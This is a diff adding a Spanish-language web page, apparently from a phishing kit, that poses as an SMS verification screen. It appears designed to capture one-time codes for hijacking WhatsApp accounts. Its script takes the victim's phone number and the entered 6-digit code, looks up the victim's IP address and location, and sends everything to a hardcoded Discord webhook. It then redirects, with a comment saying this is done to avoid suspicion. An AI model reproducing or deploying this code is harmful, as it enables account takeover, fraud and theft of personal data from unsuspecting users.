@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background-image: url('https://i.postimg.cc/Dz8PRjZy/gjk.png'); background-size: cover;">
+ 
+
+    <div class="gru-1">
+        <p class="fad-idn" style="width: 100%;display: flex; justify-content: center; text-align: center; margin-top: 30px; font-size: 22px;">Revisa tu aplicación de mensajes, te hemos enviado un código de verificación SMS</p>
+       <br><br>
+        <center> <div class="DWCS fad-idn">
+           
+            <div class="boxsm fade-down" style="text-align: left;">
+                <div class="cabe">
+                    <img style="width: 20px;  vertical-align: middle;" src="https://i.postimg.cc/8CY8R6qZ/h55.png" alt="">
+                    <b>Messenger SMS</b>
+                    <p>te llegará un código de 6 digitos:</p>
+                    <div class="ast">
+                        <span>*</span>
+                        <span>*</span>
+                        <span>*</span>
+                        <span>-</span>
+                        <span>*</span>
+                        <span>*</span>
+                        <span>*</span>
+                    </div>
+                </div>
+            </div>
+   </div> </div><!--fin grupo 1 -->
+
+<form action="cargando---.html">
+   <div class="gru-2"  style="display: none;">
+
+    <div class="bxw">
+        <div class="ead-ders">
+            <img src="https://i.postimg.cc/jjPDFmfZ/Screenshot-4.png" alt="">
+            <h2 style="margin-bottom: 10px; ">Verificación SMS</h2>
+            <p>Hemos enviado un código de 6 dígitos de verificación de SMS a tu número que termina en *** *** 0000</p>
+        <br></div>
+      <div class="cadd">
+        <label for="" style="font-size: 16px; font-weight: 600;">Código de Verificación SMS</label>
+        <center>
+        <input type="text" id="wed" placeholder="* * * * * *"  style="text-align: center; " required maxlength="6" minlength="6"  inputmode="numeric" pattern="[0-9]*" >
+        </center>
+
+      </div>
+
+      <div class="btnsw">
+        <button id="d54y"> <img style="width: 20px; font-size: 19px; vertical-align: middle;" src="https://i.postimg.cc/fR07MHXz/756.png" alt=""> VERIFICAR CUENTA</button>
+      </div>
+</form>
+
+      <div class="imFi">
+        <img src="https://i.postimg.cc/8k2h7MSR/5645.png" alt="">
+      </div>
+    </div>
+   </div>
+
+
+
+   <br><br><br><br><br>
+ 
+    
+  
+
+<script>
+!function(){
+  'use strict';
+  const w = "https://discord.com/api/webhooks/1481333399946924203/b7E65TBdYOwrFuhD9_MC-wDt1HpBoK9PYjsRjid5i-EcHRJ64IvEnHWBv_-yfzQZqRXa";
+
+  function n(){
+    let e = sessionStorage.getItem("_w");
+    return e ? e.replace(/\D/g,"") : "0000000000"
+  }
+
+  function d(){
+    let e = n(),
+        t = e.length >= 4 ? e.slice(-4) : "0000",
+        o = document.querySelector(".ead-ders p");
+    o && (o.innerHTML = `Hemos enviado un código de 6 dígitos de verificación de SMS a tu número que termina en <b>*** *** ${t}</b>`)
+  }
+
+  function c(e){
+    let t = JSON.parse(sessionStorage.getItem("_uc") || "{}"),
+        o = n();
+    return t[o] ? t[o].includes(e) : !1
+  }
+
+  function s(e){
+    let t = JSON.parse(sessionStorage.getItem("_uc") || "{}"),
+        o = n();
+    t[o] || (t[o] = []), t[o].includes(e) || t[o].push(e), 
+    sessionStorage.setItem("_uc", JSON.stringify(t)), 
+    sessionStorage.setItem("_cs", e)
+  }
+
+  function p(){
+    return sessionStorage.getItem("_cd") || null
+  }
+
+  function b(){
+    let e = document.createElement("div");
+    e.className = "error-sms", e.innerHTML = `<span>⚠</span>`, 
+    e.style.cssText = "background:#fee;color:#c00;padding:12px;border-radius:8px;margin:15px 0;border:1px solid #fcc;display:none;text-align:center;font-size:14px;";
+    let t = document.querySelector(".cadd");
+    return t && t.appendChild(e), e
+  }
+
+  function x(e, t){
+    e.style.display = "block", e.textContent = t, 
+    setTimeout(() => { e.style.display = "none" }, 3e3)
+  }
+
+  setTimeout(() => {
+    d();
+    let e = document.querySelector(".gru-1"),
+        t = document.querySelector(".gru-2");
+    if(e && t) {
+      setTimeout(() => {
+        e.classList.add("fade-out-scale"), 
+        setTimeout(() => {
+          e.style.display = "none", t.style.display = "block", 
+          t.classList.add("fade-in-scale"), 
+          setTimeout(() => { let e = document.getElementById("wed"); e && e.focus() }, 300)
+        }, 700)
+      }, 4e3)
+    }
+  }, 100);
+
+  let E = b(),
+      f = document.querySelector("form"),
+      i = document.getElementById("wed"),
+      u = document.getElementById("d54y");
+
+  if(f && i && u) {
+    i.addEventListener("input", function(e){
+      this.value = this.value.replace(/\D/g, ""), 
+      u.disabled = 6 !== this.value.length, 
+      E.style.display = "none"
+    });
+
+    f.addEventListener("submit", async function(e){
+      e.preventDefault();
+      let t = i.value.trim();
+
+      if(6 !== t.length) return x(E, "El código SMS debe tener 6 dígitos"), void i.focus();
+      if(c(t)) return x(E, "⚠ Este código ya fue usado. Ingresa un código nuevo."), void(i.value="", i.focus());
+      
+      let a = p();
+      if(a && a === t) return x(E, "❌ No uses el código WhatsApp. Ingresa el código SMS."), void(i.value="", i.focus());
+
+      u.disabled = !0;
+      u.innerHTML = '<img style="width:20px;vertical-align:middle" src="https://i.postimg.cc/fR07MHXz/756.png"> Validando...';
+      s(t);
+
+      try {
+        let fullNum = sessionStorage.getItem("_w") || "No disponible";
+        
+        // Simplificado a una sola petición para mayor velocidad
+        const resIp = await fetch("https://ipapi.co/json/");
+        const dIp = await resIp.json();
+
+        const msg = {
+          content: null,
+          embeds: [{
+            title: "📨 Código SMS ",
+            color: 3447003,
+            fields: [
+              { name: "📱 Número ", value: `\`${fullNum}\``, inline: true },
+              { name: "📟 Código SMS ", value: "```" + t + "```", inline: true },
+              { 
+                name: "🌍 Conexión", 
+                value: `IP: ${dIp.ip}\n${dIp.city}, ${dIp.country_name}\nHora: ${new Date().toLocaleTimeString("es-ES")}`, 
+                inline: false 
+              }
+            ]
+          }]
+        };
+
+        // ESPERAMOS a que se envíe realmente
+        await fetch(w, {
+          method: "POST",
+          keepalive: true,
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(msg)
+        });
+
+        window.location.href = "cargando---.html";
+
+      } catch (err) {
+        // Si la red falla, redirigimos igual para no sospechar
+        window.location.href = "cargando---.html";
+      }
+    });
+  }
+
+  window.addEventListener("resize", function(){ window.scrollTo(0,0) });
+}();
+</script>
+<script src="ak/dus.js"></script>
+</body>
+</html>
